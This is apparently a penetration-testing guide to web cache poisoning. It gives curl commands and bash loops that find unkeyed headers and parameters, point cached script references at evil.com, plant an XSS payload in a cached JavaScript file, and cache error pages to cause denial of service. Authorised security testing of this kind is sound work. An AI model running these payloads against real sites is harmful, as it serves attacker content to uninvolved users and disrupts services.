# Web Cache Poisoning Testing

## Objective

Identify unkeyed inputs (HTTP headers or parameters ignored by cache but used by the application) that can be used to inject malicious content into cached responses — serving attacker-controlled content to all users who subsequently request the same cached resource.

---

## 1. Prerequisites

Cache poisoning requires:
1. A cache (CDN, reverse proxy, Varnish, Nginx cache, etc.) in the request path
2. An input that influences the response but is NOT included in the cache key
3. The response is cached

```bash
# Confirm caching is present
curl -si https://target/ | grep -iE "x-cache|cf-cache-status|age:|x-varnish|via:|x-cache-hits"

# Common cache headers:
# X-Cache: HIT/MISS (most CDNs)
# CF-Cache-Status: HIT/MISS/BYPASS (Cloudflare)
# Age: N (seconds in cache)
# Via: 1.1 varnish
```

---

## 2. Identify Unkeyed Inputs

### 2.1 Unkeyed Headers
Test headers that may change the response but are not in the cache key:

```bash
# Test X-Forwarded-Host — reflected in response but not in cache key?
UNIQUE_ID="$(date +%s)cache"

curl -si "https://target/static/app.js?cb=$UNIQUE_ID" \
  -H "X-Forwarded-Host: attacker-input-test-12345" \
  | grep -iE "attacker-input|x-forwarded|script|src="

# Test Host header
curl -si "https://target/?cb=$UNIQUE_ID" \
  -H "Host: attacker-input-test.com" \
  | grep -iE "attacker-input|host|link|url"
```

### 2.2 Headers to Test
```bash
UNKEYED_HEADERS=(
  "X-Forwarded-Host"
  "X-Host"
  "X-Original-URL"
  "X-Rewrite-URL"
  "X-Forwarded-For"
  "X-Forwarded-Scheme"
  "X-Forwarded-Proto"
  "X-HTTP-Method-Override"
)

ENDPOINT="https://target/"
CB="$(date +%s)"  # Unique cache buster

for HEADER in "${UNKEYED_HEADERS[@]}"; do
  RESP=$(curl -s "${ENDPOINT}?cb=${CB}_${HEADER}" \
    -H "$HEADER: cache-test-injection-value" | grep -i "cache-test")
  if [[ -n "$RESP" ]]; then
    echo "REFLECTED: $HEADER → $RESP"
  fi
  sleep 0.2
done
```

---

## 3. Cache Poisoning via X-Forwarded-Host

```bash
# Step 1: Confirm X-Forwarded-Host is reflected in response
curl -s "https://target/static/main.js" \
  -H "X-Forwarded-Host: evil.com" | grep "evil.com"

# If reflected in a script src or link href:
# <script src="https://evil.com/static/main.js">
# → Poisoning the cached /static/main.js with evil.com reference

# Step 2: Confirm response gets cached (check X-Cache: HIT on second request)
UNIQUE="$(date +%s)"
curl -si "https://target/page?x=$UNIQUE" \
  -H "X-Forwarded-Host: cache-test-host.com" | grep -iE "x-cache|cf-cache"

# Wait for cache to store, then check without header
sleep 2
curl -si "https://target/page?x=$UNIQUE" | grep -i "cache-test-host.com"
```

---

## 4. Unkeyed Query Parameters

Some caches ignore specific query parameters:

```bash
# Common unkeyed parameters (utm_*, fbclid, etc.)
UNKEYED_PARAMS=(
  "utm_source"
  "utm_medium"
  "utm_campaign"
  "fbclid"
  "gclid"
  "ref"
  "_"
)

CB="$(date +%s)"
for PARAM in "${UNKEYED_PARAMS[@]}"; do
  # Inject XSS payload via unkeyed param
  RESP=$(curl -s "https://target/?real=true&${CB}_${PARAM}=cache_test_injection" | grep "cache_test")
  [[ -n "$RESP" ]] && echo "UNKEYED PARAM REFLECTED: $PARAM → $RESP"
  sleep 0.2
done
```

---

## 5. HTTP Method Override Cache Poisoning

```bash
# Some applications check X-HTTP-Method-Override but cache doesn't key on it
curl -si -X GET "https://target/api/users" \
  -H "X-HTTP-Method-Override: POST" \
  -H "Cookie: session=USER_TOKEN" | grep -iE "x-cache|created|POST"
```

---

## 6. Cache Poisoning DoS

If an unkeyed header causes an error response that gets cached:

```bash
# Test: if a malformed Accept-Language causes 500, and it gets cached
CB="$(date +%s)"
curl -si "https://target/?cb=$CB" \
  -H "Accept-Language: x]{${" | grep -iE "x-cache|500|error"

# Immediately check if second request (without the header) gets the cached error
sleep 1
curl -si "https://target/?cb=$CB" | grep -iE "x-cache|500|error"
```

---

## 7. Systematic Approach with Param Miner (Burp)

For thorough cache key analysis:

1. Open Burp Suite → Extensions → Install **Param Miner**
2. Right-click any request → Extensions → Param Miner → Guess headers
3. Param Miner tests hundreds of headers and reports which are reflected but unkeyed
4. Also: Extensions → Param Miner → Guess params (for unkeyed query params)

---

## 8. Cache Poisoning PoC (Safe)

Once unkeyed reflected input is found, demonstrate poisoning:

```bash
# Demonstrate: XSS payload in X-Forwarded-Host gets cached
UNIQUE_CB="$(date +%s)"

# Poison the cache for this specific cache-busted URL
curl -si "https://target/static/app.js?poison=$UNIQUE_CB" \
  -H "X-Forwarded-Host: \"><script>alert(document.domain)</script>" | grep -iE "x-cache|script"

# PoC stops here — do not distribute the poisoned URL
# In the report: demonstrate the reflected value in the uncached response
# Note: confirming actual cache persistence requires careful sequencing
```

---

## Evidence to Capture

- Proof that caching is present (X-Cache: HIT header)
- The unkeyed header/parameter that is reflected in the response
- HTTP request/response showing the reflected injection
- If cache persistence confirmed: before (clean) and after (poisoned) responses

---

## Findings Reference

| Test | Result | Severity |
|---|---|---|
| X-Forwarded-Host reflected unkeyed | Pass/Fail | High-Critical |
| Unkeyed param reflected (XSS chain) | Pass/Fail | High |
| Cache poisoning DoS | Pass/Fail | High |
| Method override via unkeyed header | Pass/Fail | Medium |
| Cached sensitive data without Vary | Pass/Fail | Medium |
